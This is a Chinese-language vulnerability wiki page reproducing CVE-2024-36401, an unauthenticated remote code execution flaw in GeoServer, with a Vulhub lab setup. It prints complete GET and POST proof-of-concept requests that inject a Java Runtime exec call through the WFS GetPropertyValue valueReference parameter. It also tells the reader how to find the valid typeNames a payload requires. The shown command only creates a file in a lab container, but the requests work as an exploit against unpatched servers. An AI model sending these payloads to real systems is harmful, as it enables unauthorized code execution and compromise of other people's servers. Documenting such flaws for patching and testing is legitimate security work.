<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/GeoServer%20%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-36401/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>GeoServer 属性名表达式前台代码执行漏洞 CVE-2024-36401 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "GeoServer \u5c5e\u6027\u540d\u8868\u8fbe\u5f0f\u524d\u53f0\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2024-36401", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../GoAhead%20Server%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%20CVE-2021-42342/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../GoAhead%20Server%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%20CVE-2021-42342/" class="btn btn-xs btn-link">
        GoAhead Server 环境变量注入 CVE-2021-42342
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../GeoServer%20TestWfsPost%20%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-40822/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../GeoServer%20TestWfsPost%20%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-40822/" class="btn btn-xs btn-link">
        GeoServer TestWfsPost 接口未授权 SSRF 漏洞 CVE-2021-40822
      </a>
    </div>
    
  </div>

    

    <h1 id="geoserver-cve-2024-36401">GeoServer 属性名表达式前台代码执行漏洞 CVE-2024-36401<a class="headerlink" href="#geoserver-cve-2024-36401" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p>
<p>在 GeoServer 2.25.1， 2.24.3， 2.23.5 版本及以前，未登录的任意用户可以通过构造恶意 OGC 请求，在默认安装的服务器中执行 XPath 表达式，进而利用执行 Apache Commons Jxpath 提供的功能执行任意代码。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a></li>
<li><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></li>
<li><a href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></li>
<li><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>GeoServer ≤ 2.23.5
2.24.0 &lt;= GeoServer ≤ 2.24.3
2.25.0 &lt;= GeoServer ≤ 2.25.1
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>Vulhub 执行如下命令启动一个 GeoServer 2.23.2 服务器：</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>服务启动后，你可以在 <code>http://your-ip:8080/geoserver</code> 查看到 GeoServer 的默认页面。</p>
<p><img alt="" src="../images/GeoServer%20%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-36401/image-20240704162257994.png" /></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>在官方 <a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a> 中提到可以找到漏洞相关的 WFS 方法：</p>
<blockquote>
<p>No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.
未提供公开 PoC，但已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 利用此漏洞。</p>
</blockquote>
<p>Vulhub 使用 <code>GetPropertyValue</code> 来执行 xpath 表达式，参考 <a href="https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst">官方文档</a> 构造两个 POC。基于 GET 方法的 POC：</p>
<div class="highlight"><pre><span></span><code>GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#39;touch%20/tmp/awesome_poc1&#39;) HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre></div>
<p><img alt="" src="../images/GeoServer%20%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-36401/image-20240704162941141.png" /></p>
<p>基于 POST 方法的 POC：</p>
<div class="highlight"><pre><span></span><code>POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39;
 xmlns:topp=&#39;http://www.openplans.org/topp&#39;
 xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39;
 xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;&gt;
  &lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#39;touch /tmp/awesome_poc2&#39;)&lt;/wfs:valueReference&gt;
&lt;/wfs:GetPropertyValue&gt;
</code></pre></div>
<p><img alt="" src="../images/GeoServer%20%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-36401/image-20240704163007780.png" /></p>
<p>均触发 <code>java.lang.ClassCastException</code> 类型转换异常，命令执行成功。</p>
<p>进入容器验证 <code>touch /tmp/awesome_poc1</code> 和 <code>touch /tmp/awesome_poc2</code> 执行结果：</p>
<p><img alt="" src="../images/GeoServer%20%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-36401/image-20240704163120678.png" /></p>
<p>Payload 中的 typeNames 必须存在，例如：</p>
<div class="highlight"><pre><span></span><code>&lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
</code></pre></div>
<p>可以在 Web 页面中找到当前服务器中的所有 Types：</p>
<div class="highlight"><pre><span></span><code>http://your-ip:8080/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage?2&amp;filter=false
</code></pre></div>
<p><img alt="" src="../images/GeoServer%20%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2024-36401/image-20240704163921580.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../GoAhead%20Server%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%20CVE-2021-42342/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../GoAhead%20Server%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%20CVE-2021-42342/" class="btn btn-xs btn-link">
        GoAhead Server 环境变量注入 CVE-2021-42342
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../GeoServer%20TestWfsPost%20%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-40822/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../GeoServer%20TestWfsPost%20%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-40822/" class="btn btn-xs btn-link">
        GeoServer TestWfsPost 接口未授权 SSRF 漏洞 CVE-2021-40822
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>